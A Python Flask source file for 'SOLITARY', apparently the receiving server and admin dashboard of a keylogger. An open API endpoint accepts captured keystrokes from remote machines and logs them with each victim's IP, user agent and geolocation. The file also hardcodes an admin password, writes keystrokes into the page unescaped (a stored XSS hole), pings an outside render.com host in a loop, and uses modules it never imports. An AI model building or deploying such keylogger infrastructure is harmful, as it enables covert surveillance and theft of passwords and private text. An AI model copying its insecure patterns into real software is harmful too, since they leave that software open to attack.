import os
import secrets
import hashlib
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, redirect, url_for, session, make_response, abort
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import jwt  # For secure token-based auth
from uuid import uuid4
import bcrypt  # Military-grade password hashing
import socket
import geocoder
import re
from user_agents import parse
import threading

# === CONFIGURATION === #
app = Flask(__name__)
app.secret_key = secrets.token_hex(64)  # 512-bit encryption
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///solitary_blackbox.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)  # Session timeout
app.config['JWT_SECRET'] = secrets.token_hex(64)  # JWT encryption key

# === DATABASE MODELS === #
db = SQLAlchemy(app)

class KeyLog(db.Model):
    __tablename__ = 'keystrike_records'
    id = db.Column(db.Integer, primary_key=True)
    keystrike = db.Column(db.String(1024), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip = db.Column(db.String(45))  # IPv6 support
    user_agent = db.Column(db.String(512))
    location = db.Column(db.String(100))
    threat_level = db.Column(db.Integer, default=0)  # AI threat detection

class AccessToken(db.Model):
    __tablename__ = 'access_tokens'
    id = db.Column(db.Integer, primary_key=True)
    token = db.Column(db.String(128), unique=True)
    expires_at = db.Column(db.DateTime)
    is_revoked = db.Column(db.Boolean, default=False)

class UserSession(db.Model):
    __tablename__ = 'active_sessions'
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(128))
    ip = db.Column(db.String(45))
    last_activity = db.Column(db.DateTime)

# === SECURITY LAYER === #
def generate_secure_token():
    return f"SOL_{secrets.token_hex(32)}_{int(datetime.utcnow().timestamp())}"

def hash_password(password):
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(14)).decode('utf-8')

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))

def geo_locate(ip):
    try:
        if ip == '127.0.0.1':
            return "LOCALHOST"
        g = geocoder.ip(ip)
        return f"{g.city}, {g.country}" if g.city else g.country
    except:
        return "UNKNOWN"

def detect_threat(user_agent):
    ua = parse(user_agent)
    if ua.is_bot or "scan" in user_agent.lower():
        return 5  # Critical threat
    return 0

# === AUTHENTICATION === #
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            abort(403, "ACCESS DENIED: SESSION TERMINATED")
        return f(*args, **kwargs)
    return decorated

# === ROUTES === #
@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if (request.form.get('username') == "SOLITARY_ADMIN" and 
            verify_password(request.form.get('password'), hash_password("Sollamatenda@1234"))):
            
            session['authenticated'] = True
            session['secure_token'] = generate_secure_token()
            session['last_activity'] = datetime.utcnow()
            
            # Log session
            db.session.add(UserSession(
                session_id=session['secure_token'],
                ip=request.remote_addr,
                last_activity=datetime.utcnow()
            ))
            db.session.commit()
            
            return redirect('/dashboard')
        
        return '''
        <script>
            alert("INTRUSION DETECTED: INVALID CREDENTIALS");
            setTimeout(() => { window.location.href = "/login"; }, 1000);
        </script>
        '''
    
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SOLITARY :: AUTHENTICATION</title>
        <style>
            :root {
                --neon-green: #0f0;
                --dark-matrix: #000;
                --cyber-black: #111;
            }
            body {
                background: var(--dark-matrix);
                color: var(--neon-green);
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                overflow: hidden;
            }
            .cyber-form {
                border: 1px solid var(--neon-green);
                padding: 2rem;
                width: 400px;
                box-shadow: 0 0 30px var(--neon-green);
                position: relative;
                overflow: hidden;
            }
            .cyber-form::before {
                content: "";
                position: absolute;
                top: -10px;
                left: -10px;
                right: -10px;
                bottom: -10px;
                background: linear-gradient(45deg, 
                    transparent, 
                    var(--neon-green), 
                    transparent);
                z-index: -1;
                animation: scan 8s linear infinite;
                opacity: 0.1;
            }
            @keyframes scan {
                0% { transform: translateY(-100%); }
                100% { transform: translateY(100%); }
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: var(--cyber-black);
                color: var(--neon-green);
                border: 1px solid var(--neon-green);
                font-family: 'Courier New', monospace;
            }
            button {
                width: 100%;
                padding: 12px;
                background: var(--neon-green);
                color: var(--dark-matrix);
                border: none;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s;
            }
            button:hover {
                background: #0c0;
            }
            .cyber-title {
                text-align: center;
                font-size: 2.5rem;
                margin-bottom: 2rem;
                text-shadow: 0 0 10px var(--neon-green);
                letter-spacing: 4px;
            }
        </style>
    </head>
    <body>
        <div class="cyber-form">
            <div class="cyber-title">SOLITARY</div>
            <form method="POST">
                <input type="text" name="username" placeholder="USERNAME" required>
                <input type="password" name="password" placeholder="PASSPHRASE" required>
                <button type="submit">INITIATE SEQUENCE</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/dashboard')
@login_required
def dashboard():
    logs = KeyLog.query.order_by(KeyLog.timestamp.desc()).limit(200).all()
    
    log_data = ""
    for log in logs:
        threat_color = "#ff5555" if log.threat_level > 3 else "#0f0"
        log_data += f"""
        <tr>
            <td>{log.timestamp.strftime('%Y-%m-%d %H:%M:%S')}</td>
            <td>{log.ip}</td>
            <td style="color: {threat_color}">{log.keystrike}</td>
            <td>{log.location}</td>
            <td style="color: {threat_color}">{"⚠️" * log.threat_level if log.threat_level > 0 else "✅"}</td>
        </tr>
        """
    
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SOLITARY :: DASHBOARD</title>
        <style>
            :root {{
                --neon-green: #0f0;
                --dark-matrix: #000;
                --cyber-black: #111;
                --cyber-red: #f00;
            }}
            body {{
                background: var(--dark-matrix);
                color: var(--neon-green);
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 0;
            }}
            .cyber-header {{
                background: var(--cyber-black);
                padding: 1rem;
                border-bottom: 1px solid var(--neon-green);
                display: flex;
                justify-content: space-between;
                align-items: center;
            }}
            .cyber-logo {{
                font-size: 1.8rem;
                font-weight: bold;
                text-shadow: 0 0 10px var(--neon-green);
                letter-spacing: 3px;
            }}
            .cyber-nav {{
                display: flex;
                gap: 1rem;
            }}
            .cyber-btn {{
                background: var(--neon-green);
                color: var(--dark-matrix);
                border: none;
                padding: 0.6rem 1.2rem;
                font-weight: bold;
                cursor: pointer;
                text-decoration: none;
            }}
            .cyber-container {{
                padding: 2rem;
            }}
            .cyber-stats {{
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 1rem;
                margin-bottom: 2rem;
            }}
            .stat-box {{
                border: 1px solid var(--neon-green);
                padding: 1rem;
                text-align: center;
            }}
            .stat-box h3 {{
                margin-top: 0;
            }}
            .stat-box .critical {{
                color: var(--cyber-red);
            }}
            table {{
                width: 100%;
                border-collapse: collapse;
                margin-top: 1rem;
                border: 1px solid var(--neon-green);
            }}
            th, td {{
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid var(--neon-green);
            }}
            th {{
                background: var(--cyber-black);
                position: sticky;
                top: 0;
            }}
            tr:hover {{
                background: rgba(0, 255, 0, 0.05);
            }}
            .threat-critical {{
                color: var(--cyber-red);
                font-weight: bold;
            }}
        </style>
    </head>
    <body>
        <div class="cyber-header">
            <div class="cyber-logo">SOLITARY v3.0</div>
            <div class="cyber-nav">
                <a href="/logout" class="cyber-btn">TERMINATE SESSION</a>
            </div>
        </div>
        <div class="cyber-container">
            <div class="cyber-stats">
                <div class="stat-box">
                    <h3>TOTAL KEYSTRIKES</h3>
                    <p>{KeyLog.query.count()}</p>
                </div>
                <div class="stat-box">
                    <h3>ACTIVE THREATS</h3>
                    <p class="critical">{KeyLog.query.filter(KeyLog.threat_level > 3).count()}</p>
                </div>
                <div class="stat-box">
                    <h3>UNIQUE SOURCES</h3>
                    <p>{len(set(log.ip for log in logs))}</p>
                </div>
                <div class="stat-box">
                    <h3>SESSION ID</h3>
                    <p>{session.get('secure_token', 'N/A')[:12]}...</p>
                </div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>TIMESTAMP</th>
                        <th>SOURCE IP</th>
                        <th>KEYSTRIKE</th>
                        <th>LOCATION</th>
                        <th>THREAT</th>
                    </tr>
                </thead>
                <tbody>
                    {log_data}
                </tbody>
            </table>
        </div>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return '''
    <script>
        alert("SESSION TERMINATED");
        window.location.href = "/login";
    </script>
    '''

@app.route('/api/v1/keystrike', methods=['POST'])
def log_keystrike():
    if not request.is_json:
        abort(400, "INVALID REQUEST: JSON REQUIRED")
    
    data = request.get_json()
    keystrike = data.get('keystrike')
    if not keystrike:
        abort(400, "MISSING KEYSTRIKE DATA")
    
    # Threat analysis
    threat_level = detect_threat(request.user_agent.string)
    
    # Log the keystrike
    new_log = KeyLog(
        keystrike=keystrike,
        ip=request.remote_addr,
        user_agent=request.user_agent.string,
        location=geo_locate(request.remote_addr),
        threat_level=threat_level
    )
    db.session.add(new_log)
    db.session.commit()
    
    return jsonify({
        "status": "success",
        "threat_detected": threat_level > 0,
        "log_id": new_log.id
    }), 201

def periodic_request():
    while True:
        try:
            response = requests.get("https://cryptxhere.onrender.com")
            print(f"[PING] {datetime.utcnow().isoformat()} - Status: {response.status_code}")
        except Exception as e:
            print(f"[ERROR] {datetime.utcnow().isoformat()} - {e}")
        time.sleep(10)



if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    threading.Thread(target=periodic_request, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
